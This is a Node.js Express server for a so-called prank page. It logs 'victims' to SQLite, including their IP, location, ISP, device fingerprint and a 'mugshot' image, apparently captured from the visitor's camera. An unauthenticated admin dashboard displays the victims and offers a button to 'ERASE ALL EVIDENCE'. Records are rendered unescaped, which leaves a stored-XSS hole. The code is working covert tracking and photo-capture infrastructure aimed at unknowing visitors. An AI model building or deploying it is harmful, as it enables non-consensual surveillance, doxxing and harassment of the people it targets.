const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const bodyParser = require('body-parser');
const cors = require('cors');
const path = require('path');
const fs = require('fs');

// Ensure data directory exists
const dataDir = path.join(__dirname, 'data');
if (!fs.existsSync(dataDir)) {
    fs.mkdirSync(dataDir);
}

const app = express();
const PORT = 3000;

// Middleware
app.use(cors({
    origin: ['http://localhost:3000', 'https://authentobaco.netlify.app', 'http://127.0.0.1:5500', 'http://localhost:5500', 'http://localhost:5173', 'https://light-kings-fetch.loca.lt'],
    credentials: true
}));
app.use(bodyParser.json({ limit: '50mb' })); // Large limit for images
app.use(express.static(__dirname));

// Database Setup
const db = new sqlite3.Database(path.join(dataDir, 'victims.db'), (err) => {
    if (err) console.error(err.message);
    console.log('Connected to the victims database.');
});

db.serialize(() => {
    // Create base table if it doesn't exist
    db.run(`CREATE TABLE IF NOT EXISTS victims (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
        ip TEXT,
        location TEXT,
        browser TEXT,
        os TEXT,
        resolution TEXT,
        language TEXT,
        mugshot TEXT
    )`);

    // --- AUTO-MIGRATION: ADD MISSING COLUMNS ---
    const columns = [
        'user_agent', 'timezone', 'isp', 'org', 'asn', 'network',
        'cores', 'ram', 'connection', 'platform', 'vendor'
    ];

    columns.forEach(col => {
        db.run(`ALTER TABLE victims ADD COLUMN ${col} TEXT`, (err) => {
            if (err) {
                // Ignore "duplicate column" errors which happen if they already exist
                if (!err.message.includes("duplicate column name")) {
                    console.error(`Migration error on column ${col}:`, err.message);
                }
            } else {
                console.log(`Migration: Added column ${col}`);
            }
        });
    });
});

// Serve the prank page as the root to avoid Live Server issues
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Admin Route to view victims
app.get('/admin', (req, res) => {
    db.all("SELECT * FROM victims ORDER BY timestamp DESC", [], (err, rows) => {
        if (err) return res.status(500).send(err.message);

        let html = `
        <html>
        <head>
            <title>PRANK_MASTER_ADMIN</title>
            <style>
                body { background: #000; color: #0f0; font-family: 'Courier New', Courier, monospace; padding: 20px; text-transform: uppercase; margin: 0; }
                .header { 
                    background: #050505; 
                    padding: 20px; 
                    border-bottom: 2px solid #0f0; 
                    display: flex; 
                    justify-content: space-between; 
                    align-items: center; 
                    position: sticky; 
                    top: 0; 
                    z-index: 100;
                    box-shadow: 0 5px 20px rgba(0,255,0,0.2);
                }
                .title { font-size: 24px; font-weight: bold; letter-spacing: 5px; color: #fff; text-shadow: 0 0 10px #0f0; }
                .stats { font-size: 14px; color: #f0f; }
                .container { 
                    max-width: 1400px; 
                    margin: 40px auto; 
                    display: grid; 
                    grid-template-columns: repeat(auto-fill, minmax(350px, 1fr)); 
                    gap: 30px; 
                    padding: 0 20px;
                }
                .victim-card { 
                    background: #0a0a0a; 
                    border: 1px solid #222; 
                    padding: 0; 
                    transition: all 0.3s ease; 
                    overflow: hidden;
                    position: relative;
                    display: flex;
                    flex-direction: column;
                }
                .victim-card:hover { 
                    border-color: #0f0; 
                    transform: translateY(-5px); 
                    box-shadow: 0 10px 40px rgba(0,255,0,0.4); 
                }
                .mugshot-wrapper { 
                    width: 100%; 
                    height: 350px; 
                    background: #111; 
                    position: relative; 
                    overflow: hidden; 
                    border-bottom: 1px solid #333;
                }
                .mugshot-wrapper img { 
                    width: 100%; 
                    height: 100%; 
                    object-fit: cover; 
                    filter: grayscale(1) contrast(1.2); 
                    transition: all 0.5s;
                }
                .victim-card:hover .mugshot-wrapper img { 
                    filter: none; 
                    transform: scale(1.05); 
                }
                .card-content { padding: 20px; flex-grow: 1; }
                .card-content p { margin: 8px 0; font-size: 12px; border-bottom: 1px solid #111; padding-bottom: 4px; display: flex; justify-content: space-between; }
                .label { color: #555; font-size: 10px; }
                .value { color: #0f0; font-weight: bold; text-align: right; }
                .timestamp { position: absolute; top: 10px; right: 10px; background: rgba(0,0,0,0.8); padding: 5px; font-size: 10px; color: #f00; z-index: 10; border: 1px solid #f00; }
                .no-data { text-align: center; padding: 100px; font-size: 20px; color: #444; width: 100vw; }
                
                /* Scanline effect */
                .scanline {
                    width: 100%;
                    height: 2px;
                    background: rgba(0, 255, 0, 0.2);
                    position: absolute;
                    top: 0;
                    left: 0;
                    z-index: 5;
                    animation: scan 4s linear infinite;
                }
                @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }

                .system-report {
                    font-size: 10px;
                    color: #555;
                    margin-top: 10px;
                    padding-top: 10px;
                    border-top: 1px dashed #333;
                }
                .btn-danger {
                    background: #f00; color: #fff; border: none; padding: 5px 10px; cursor: pointer; font-size: 10px; border-radius: 3px;
                }
                .dashboard-controls { padding: 0 20px 20px 20px; }
            </style>
            <script>
                function clearStats() {
                    if(confirm("THIS WILL ERASE ALL EVIDENCE. PROCEED?")) {
                        fetch('/clear-logs', { method: 'POST' }).then(() => location.reload());
                    }
                }
            </script>
        </head>
        <body>
            <div class="header">
                <div class="title">TITAN_PRANK_DASHBOARD_v4.0</div>
                <div class="stats">TOTAL_VICTIMS: ${rows.length}</div>
            </div>
            <div class="dashboard-controls">
                <button class="btn-danger" onclick="clearStats()">[ FULL_WIPE_DATABASE ]</button>
            </div>
            ${rows.length === 0 ? '<div class="no-data">NO DATA RECEIVED SECTOR 7G... AWAITING TRANSMISSION.</div>' : `
            <div class="container">
                ${rows.map(row => `
                <div class="victim-card">
                    <div class="timestamp">${row.id} | ${row.timestamp}</div>
                    <div class="mugshot-wrapper">
                        <div class="scanline"></div>
                        ${row.mugshot ? `<img src="${row.mugshot}" alt="Capture">` : '<div style="background:#200; height:100%; display:flex; align-items:center; justify-content:center; color:#f00;">[ MUGSHOT_REDACTED ]</div>'}
                    </div>
                    <div class="card-content">
                        <p><span class="label">IP_ADDRESS:</span> <span class="value">${row.ip || 'ANONYMOUS'}</span></p>
                        <p><span class="label">LOCATION:</span> <span class="value">${row.location || 'UNKNOWN'}</span></p>
                        <p><span class="label">ISP:</span> <span class="value">${row.isp || 'N/A'}</span></p>
                        <p><span class="label">TIMEZONE:</span> <span class="value">${row.timezone || 'N/A'}</span></p>
                        <p><span class="label">HARDWARE:</span> <span class="value">${row.cores || '?'}_CPU | ${row.ram || '?'}</span></p>
                        <p><span class="label">SYSTEM:</span> <span class="value">${row.browser || 'UNKNOWN'}</span></p>
                        <p><span class="label">OS:</span> <span class="value">${row.os || 'UNKNOWN'} (${row.platform || '?'})</span></p>
                        <p><span class="label">RESOLUTION:</span> <span class="value">${row.resolution || '?'}</span></p>
                        <div class="system-report">
                            UA: ${row.user_agent || 'N/A'}<br>
                            NET: ${row.network || 'N/A'} | CON: ${row.connection || 'N/A'}<br>
                            VENDOR: ${row.vendor || 'N/A'}
                        </div>
                    </div>
                </div>
                `).join('')}
            </div>
            `}
        </body>
        </html>
        `;
        res.send(html);
    });
});

// Redirect /prank to root
app.get('/prank', (req, res) => res.redirect('/'));

// Endpoint to log victims
app.post('/log-victim', (req, res) => {
    const {
        ip, city, country_name, browser, os, resolution, language, mugshot,
        user_agent, timezone, isp, org, asn, network,
        cores, ram, connection, platform, vendor
    } = req.body;

    const location = `${city || 'Unknown'}, ${country_name || 'Unknown'}`;

    const sql = `INSERT INTO victims (ip, location, browser, os, resolution, language, mugshot, user_agent, timezone, isp, org, asn, network, cores, ram, connection, platform, vendor) 
                 VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`;

    db.run(sql, [
        ip, location, browser, os, resolution, language, mugshot, user_agent, timezone, isp, org, asn, network,
        cores, ram, connection, platform, vendor
    ], function (err) {
        if (err) {
            console.error(err.message);
            return res.status(500).json({ error: 'Failed to save data' });
        }
        console.log(`Log saved for IP: ${ip} (ID: ${this.lastID})`);
        res.json({ success: true, id: this.lastID });
    });
});

app.post('/clear-logs', (req, res) => {
    db.run("DELETE FROM victims", (err) => {
        if (err) return res.status(500).json({ error: err.message });
        res.json({ success: true });
    });
});

app.listen(PORT, () => {
    console.log(`
=============================================
  PRANK BACKEND STARTED
  Server: http://localhost:${PORT}
  Logs will be saved to: data/victims.db
=============================================
    `);
});
